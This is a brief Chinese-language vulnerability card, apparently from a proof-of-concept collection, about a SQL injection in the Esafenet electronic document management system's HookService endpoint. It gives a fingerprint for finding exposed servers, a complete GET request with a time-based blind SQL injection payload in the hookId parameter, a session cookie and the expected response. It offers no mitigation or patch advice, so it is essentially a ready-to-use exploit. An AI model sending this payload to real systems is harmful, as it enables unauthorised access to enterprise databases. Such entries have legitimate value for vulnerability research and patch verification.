# 亿赛通电子文档管理系统EsafeNetHookService存在SQL注入漏洞

- **系统**：亿赛通电子文档管理系统　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`body="/CDGServer3/index.jsp"`
- **请求**：`GET /CDGServer3/parameter/HookService;logindojojs?command=DelHookService&hookId=1%27;if(db_name()=%27CobraDGServer%27)+WAITFOR+DELAY+%270:0:5%27--  HTTP/1.1`
- **关键头**：`Cookie: JSESSIONID=2E1EFAD5AA93A73F4184D010D43FF077`
- **预期**：404　|　—